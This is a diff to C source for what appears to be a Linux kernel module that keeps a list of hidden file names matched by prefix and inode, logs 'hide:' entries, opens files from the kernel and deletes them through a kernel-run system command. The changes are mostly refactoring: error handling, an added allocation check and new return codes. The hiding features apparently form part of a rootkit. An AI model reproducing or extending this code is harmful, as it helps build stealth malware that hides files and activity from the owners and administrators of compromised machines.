@@ -21,51 +21,53 @@
 bool fs_kern_path(const char *name, struct path *path)
 {
 	if (!name || !path)
-		goto error;
+		return false;
 
-#ifdef get_fs
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 10, 0)
 	mm_segment_t security_old_fs;
 	security_old_fs = get_fs();
 	set_fs(KERNEL_DS);
 #endif
 
-	if (kern_path(name, LOOKUP_FOLLOW, path))
-		goto error;
+	if (kern_path(name, LOOKUP_FOLLOW, path)) {
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 10, 0)
+		set_fs(security_old_fs);
+#endif
+		return false;
+	}
 
-#ifdef get_fs
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 10, 0)
 	set_fs(security_old_fs);
 #endif
 	return true;
-error:
-	return false;
 }
 
-/**
- * callee must put the reference back
- * with path_put after calling this function
- */
+// callee must put the reference back
+// with path_put after calling this function
 bool fs_file_stat(struct path *path, struct kstat *stat)
 {
-#ifdef get_fs
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 10, 0)
 	mm_segment_t security_old_fs;
 #endif
 	if (!path || !stat)
-		goto error;
+		return false;
 
-#ifdef get_fs
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 10, 0)
 	security_old_fs = get_fs();
 	set_fs(KERNEL_DS);
 #endif
 
-	if (vfs_getattr(path, stat, STATX_BASIC_STATS, AT_STATX_SYNC_AS_STAT))
-		goto error;
+	if (vfs_getattr(path, stat, STATX_BASIC_STATS, AT_STATX_SYNC_AS_STAT)) {
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 10, 0)
+		set_fs(security_old_fs);
+#endif
+		return false;
+	}
 
-#ifdef get_fs
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 10, 0)
 	set_fs(security_old_fs);
 #endif
 	return true;
-error:
-	return false;
 }
 
 struct fs_file_node *fs_load_fnode(struct file *f)
@@ -118,12 +120,10 @@ struct fs_file_node *fs_load_fnode(struct file *f)
 	op->getattr(task_active_pid_ns(current)->proc_mnt, f->f_dentry, &stat);
 #endif
 
-	/**
-     * Once you know the inode number it is very easy to get the
-     * executable full path by relying to find command:
-     *
-     * # find /path/to/mountpoint -inum <inode number> 2>/dev/null
-     */
+	// Once you know the inode number it is very easy to get the
+	// executable full path by relying to find command:
+	//
+	// # find /path/to/mountpoint -inum <inode number> 2>/dev/null
 	fnode->ino = stat.ino;
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	fnode->filename = (const char *)f->f_dentry->d_name.name;
@@ -141,17 +141,13 @@ struct fs_file_node *fs_get_file_node(const struct task_struct *task)
 	if (!task)
 		return NULL;
 
-	/**
-     * Not error, it is kernel task
-     * and there is no file associated with it.
-     */
+	// Not error, it is kernel task
+	// and there is no file associated with it.
 	if (!task->mm)
 		return NULL;
 
-	/*
-     * It's a regular task and there is
-     * executable file.
-     */
+	// It's a regular task and there is
+	// executable file.
 	f = task->mm->exe_file;
 	if (!f)
 		return NULL;
@@ -173,14 +169,14 @@ bool fs_search_name(const char *name, u64 ino)
 {
 	struct hidden_names *node, *node_safe;
 	list_for_each_entry_safe (node, node_safe, &names_node, list) {
-		/** This will match any string starting with pattern */
+		// This will match any string starting with pattern
 		if (!strncmp(node->name, name, strlen(node->name))) {
-			/** and this will filter by inode number, if set. */
+			// and this will filter by inode number, if set.
 			if (0 == node->ino || ino == node->ino)
-				return true; /** found match */
+				return true; // found match
 		}
 	}
-	/** not found */
+	// not found
 	return false;
 }
 
@@ -245,14 +241,15 @@ static int _fs_add_name(const char *name, bool ro, u64 ino, u64 ino_parent,
 			return -ENOMEM;
 
 		hn->name = kcalloc(1, len + 1, GFP_KERNEL);
+		if (!hn->name) {
+			kfree(hn);
+			return -ENOMEM;
+		}
 		strncpy(hn->name, (const char *)name, len);
 		hn->ro = ro;
 		hn->ino = ino;
 		hn->is_dir = is_dir;
 		hn->ino_parent = ino_parent;
-		/** the gap caused by banned words
-         * is the most fun
-         */
 		prinfo("hide: '%s'\n", hn->name);
 		list_add_tail(&hn->list, &names_node);
 	}
@@ -277,13 +274,13 @@ int fs_add_name_rw_dir(const char *name, u64 ino, u64 ino_parent, bool is_dir)
 	return _fs_add_name(name, false, ino, ino_parent, is_dir);
 }
 
-bool fs_del_name(const char *name)
+int fs_del_name(const char *name)
 {
 	struct hidden_names *node, *node_safe;
 	int deleted = 0;
 
 	if (!name)
-		return false;
+		return -EINVAL;
 
 	list_for_each_entry_safe (node, node_safe, &names_node, list) {
 		if (node->ro)
@@ -298,7 +295,7 @@ bool fs_del_name(const char *name)
 		}
 	}
 
-	return (deleted ? true : false);
+	return (deleted ? 0 : -EINVAL);
 }
 
 void fs_names_cleanup(void)
@@ -343,7 +340,7 @@ struct file *fs_kernel_open_file(const char *name)
 		return NULL;
 	}
 
-	/** I won't let it go. Thanks. (kernel joke) */
+	// I won't let it go. Thanks. (kernel joke)
 	filp = filp_open(name, O_CREAT | O_APPEND | O_RDWR | O_LARGEFILE, 0600);
 	if (IS_ERR(filp)) {
 		prerr("Failed to open file %s: (%ld)\n", name, PTR_ERR(filp));
@@ -405,7 +402,7 @@ int fs_file_rm(char *name)
 		return -EINVAL;
 
 	rm[2] = name;
-	if ((ret = kv_run_system_command(rm)))
+	if ((ret = kv_run_system_command(rm, false, false)))
 		prerr("Error removing %s\n", name);
 
 	return ret;
